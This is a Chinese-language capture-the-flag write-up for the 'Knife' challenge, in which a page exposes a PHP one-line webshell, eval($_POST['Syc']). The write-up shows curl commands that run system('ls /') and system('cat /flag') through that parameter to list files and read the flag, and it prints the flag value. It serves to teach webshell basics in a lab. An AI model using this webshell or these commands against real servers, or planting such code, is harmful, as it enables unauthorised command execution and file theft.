# [极客大挑战 2019]Knife

## 题目概述
题目名称为"Knife"（菜刀），页面提示"我家菜刀丢了"，直接在页面源码中暴露了一句话木马 `eval($_POST["Syc"]);`。

## 信息收集
访问题目页面，源码中可见：
- 标题：白给的shell
- 页面正文直接显示：`eval($_POST["Syc"]);`

这是一个标准的 PHP 一句话木马，接受 POST 参数 `Syc`，通过 `eval()` 执行任意 PHP 代码。

## 漏洞分析
- **漏洞类型**：一句话木马（Webshell）/ 任意命令执行
- **原理**：`eval($_POST["Syc"])` 将用户 POST 的 `Syc` 参数值作为 PHP 代码执行，配合 `system()` 函数即可执行系统命令
- **判断过程**：页面直接给出了一句话木马，无需任何探测

## 利用过程

**Step 1：确认木马可用，执行系统命令**
```bash
curl -s -X POST "http://靶机地址/" -d 'Syc=system("ls /");'
```
返回根目录文件列表，确认存在 `/flag` 文件。

**Step 2：读取 flag**
```bash
curl -s -X POST "http://靶机地址/" -d 'Syc=system("cat /flag");'
```

**Flag**: `flag{8e9d6672-ca0b-456c-9919-e77e67177de5}`

## 复现步骤
1. `curl -s http://靶机地址/` 查看源码，发现 `eval($_POST["Syc"]);`
2. `curl -s -X POST http://靶机地址/ -d 'Syc=system("cat /flag");'` 读取 flag

## 技术总结
| 漏洞类型 | 攻击入口 | 核心Payload | 知识点 |
|---------|---------|------------|-------|
| PHP一句话木马 | POST参数 Syc | `Syc=system("cat /flag");` | eval() + system() 执行系统命令 |

## 知识总结
- **菜刀**：题目名"Knife"暗示使用"中国菜刀"类工具连接一句话木马
- 一句话木马基本形式：`eval($_POST["参数名"]);`，通过 POST 数据传入 PHP 代码
- 配合 `system()`/`passthru()`/`shell_exec()` 等函数可执行系统命令
- 本题属于白给题，页面直接暴露了木马代码和参数名，无需任何绕过
